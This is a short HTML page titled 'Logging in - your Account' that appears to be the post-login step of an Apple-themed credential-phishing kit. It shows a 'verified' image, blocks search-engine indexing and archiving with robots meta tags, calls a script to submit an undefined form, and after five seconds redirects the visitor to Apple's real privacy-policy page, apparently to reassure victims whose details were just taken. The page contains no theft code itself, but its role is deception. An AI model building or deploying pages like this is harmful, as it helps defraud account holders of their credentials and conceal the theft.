<!DOCTYPE html>
<html lang="en" >
   <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Logging in - your Account</title>
    <link media="screen" rel="stylesheet" type="text/css" href="assets/css/wait.css">
    <script language="JavaScript" src="assets/js/jquery.js"></script>
    <meta NAME="robots" CONTENT="noindex">
    <meta NAME="robots" CONTENT="nofollow">
    <meta NAME="robots" CONTENT="noarchive">
    <meta NAME="robots" CONTENT="nosnippet">
    <meta NAME="robots" CONTENT="noodp">
    <meta NAME="robots" CONTENT="noydir">
     <style>
      .verif {
          display:block;
          padding:10px;
          background-color: white;
          text-align:center;
          border-radius: 4px;
          -webkit-border-radius: 4px;
          -moz-border-radius: 4px;
          -o-border-radius: 4px;
          -khtml-border-radius: 4px;
          -webkit-box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
          -moz-box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
          background: #fff;
          border: 1px solid;
          border-color: #e5e5e5 #dbdbdb #d2d2d2;
          -webkit-box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
          -moz-box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
          box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
          width: 800px;
          margin: 20px auto;
      }
      </style>
   </head>
   <body>
    <div class="verif">
     <img src="assets/img/verified.png">
    </div>

<META HTTP-EQUIV='refresh' content='5; URL=http://www.apple.com/privacy/privacy-policy/'>
    <script language="JavaScript">
    document.form1.submit();
    </script>
</body>
</html>